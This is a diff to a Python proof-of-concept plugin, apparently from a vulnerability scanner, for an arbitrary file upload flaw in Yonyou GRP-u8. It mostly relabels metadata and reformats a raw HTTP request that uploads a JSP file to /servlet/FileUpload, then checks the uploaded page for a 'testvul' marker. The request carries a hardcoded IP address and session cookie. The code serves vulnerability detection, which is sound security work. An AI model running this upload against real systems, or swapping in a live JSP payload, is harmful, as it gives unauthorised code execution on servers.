@@ -6,7 +6,7 @@ import time
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'yongyou_0020' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0020' # 平台漏洞编号，留空
     name = '用友 GRP-u8系统任意文件上传' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_UPLOAD # 漏洞类型
@@ -17,7 +17,7 @@ class Vuln(ABVuln):
     ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0111404' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown' #cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
@@ -37,20 +37,19 @@ class Poc(ABPoc):
             vun_url=arg+"/servlet/FileUpload?fileName=test.jsp&actionID=update"
             verify_url=arg+"/R9iPortal/upload/test.jsp"
             raw='''POST /servlet/FileUpload?fileName=test.jsp&actionID=update HTTP/1.1
-                Host: 125.67.66.250:801
-                Content-Length: 29
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Origin: null
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
-                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryttI4BZKhDL2Vl8rL
-                Accept-Encoding: gzip, deflate
-                Accept-Language: zh-CN,zh;q=0.8
-                Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C
+Host: 125.67.66.250:801
+Content-Length: 29
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: null
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryttI4BZKhDL2Vl8rL
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C
 
-                <% out.println("testvul");%>
-                '''
+<% out.println("testvul");%>'''
             code,head,res,errcode,finalurl=hh.http(vun_url,raw=raw)
             code,head,res,errcode,finalurl=hh.http(verify_url)
             if code==200 and "testvul" in res:
